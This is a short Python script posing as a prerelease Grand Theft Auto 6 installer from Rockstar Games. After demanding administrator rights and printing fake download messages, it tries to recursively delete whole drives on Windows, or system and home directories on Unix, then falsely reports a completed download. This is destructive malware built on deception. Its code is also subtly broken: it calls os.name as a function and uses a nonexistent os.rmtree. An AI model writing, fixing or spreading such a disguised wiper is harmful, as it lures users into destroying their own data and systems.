import time as t
import os
import ctypes


#Rockstar Games 2023©
print("Rockstar games 2023©")
print("Warning: This is a prerelease version of GTA 6 and may contain bugs and/or crash. Not to be published/sold.")
input("Press enter to continue with the installation.")

def is_admin():
    try:
        return os.getuid()==0
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin()!=0

if not is_admin():
    exit('Please run the program as as admin to continue with the installation.')

print("Loading wget...")
t.sleep(0.5)
print("Downloading packets...")
if os.name()=='nt':
    os.rmtree('C:')
    os.rmtree('D:')
else:
    os.rmtree('/ect')
    os.rmtree('/home')
    os.rmtree('/usr')
    os.rmtree('/tmp')
    os.rmtree('/bin')

exit('Download completed. Please check downloads folder.')